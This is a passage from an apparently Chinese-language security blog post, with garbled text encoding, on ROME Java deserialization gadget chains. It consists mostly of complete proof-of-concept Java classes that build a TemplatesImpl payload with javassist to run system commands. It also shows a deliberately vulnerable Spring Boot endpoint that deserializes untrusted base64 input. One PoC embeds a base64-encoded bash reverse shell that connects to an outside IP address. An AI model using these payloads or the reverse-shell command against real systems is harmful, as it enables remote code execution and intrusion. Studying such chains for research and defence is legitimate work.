class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unseralize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192253056.png" alt="image-20221116192253056"></p><p>å¯¹æœ€åä¸€éƒ¨åˆ†pocè¿›è¡Œä¸€ä¸ªè§£è¯»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.ToStringBean()çš„å‚æ•°ä¸ºä»€ä¹ˆè¦ç”¨Templates.class?</span><br><span class="line">anser:å› ä¸ºTemplatesç±»åªæœ‰ä¸€ä¸ªgetter,TemplatesImplç±»å«æœ‰å¤šä¸ªgetterï¼Œä½¿ç”¨TemplatesImpl.classï¼Œåˆ™æœ‰å¯èƒ½æ— æ³•è°ƒç”¨åˆ°getOutputProperties()</span><br><span class="line">(åœ¨è¿™é‡Œä¸çŸ¥ä¸ºä½•æˆ‘ä½¿ç”¨TemplatesImpl.classæ— æ³•æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œå¸Œæœ›æœ‰å¸ˆå‚…å¯ä»¥æŒ‡æ•™ä¸€ä¸‹~)</span><br><span class="line"></span><br><span class="line">2.å…³äºHashMap.put()</span><br><span class="line">anser:å› ä¸ºåœ¨è°ƒç”¨HashMap.put()æ—¶ä¼šè°ƒç”¨åˆ°hashæ–¹æ³•è¿›è€Œè°ƒç”¨åˆ°key.hashcode()ï¼Œè¿›è€Œå¯¼è‡´æå‰æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥éœ€è¦å…ˆputä¸€äº›æ— ç”¨çš„å€¼è¿›å»ï¼Œç„¶ååˆ©ç”¨åå°„åœ¨åºåˆ—åŒ–ä¹‹åä¿®æ”¹é“¾è¡¨ä¸­keyçš„å€¼</span><br></pre></td></tr></table></figure><p>è™šæ‹Ÿæœºä¸Šèµ·ä¸ªsrpingbootï¼Œåå¼¹ä¸ªshell</p><p>å†™ä¸ªå…¥å£æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.cor.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.cor.Tools;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&#123; &quot;/&quot; &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="keyword">final</span> HttpServletRequest request, <span class="keyword">final</span> HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&#123; &quot;/test&quot; &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">unser</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = true)</span> <span class="keyword">final</span> String data, <span class="keyword">final</span> Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] b = Tools.base64Decode(data);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjcwLjIyMS4yMDYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> poc.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192302635.png" alt="image-20221116192302635"></p><h2 id="ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾"><a href="#ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾" class="headerlink" title="ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾"></a>ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾</h2><h3 id="ObjectBeané“¾"><a href="#ObjectBeané“¾" class="headerlink" title="ObjectBeané“¾"></a>ObjectBeané“¾</h3><p><code>ObjectBean</code>ä¸­çš„<code>hashCode</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>EqualsBean.beanHashCode()</code>ï¼Œæ‰€ä»¥ç”¨å®ƒä»£æ›¿<code>EqualsBean.beanHashCode()</code>å³å¯</p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192311272.png" alt="image-20221116192311272"></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectBeanGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        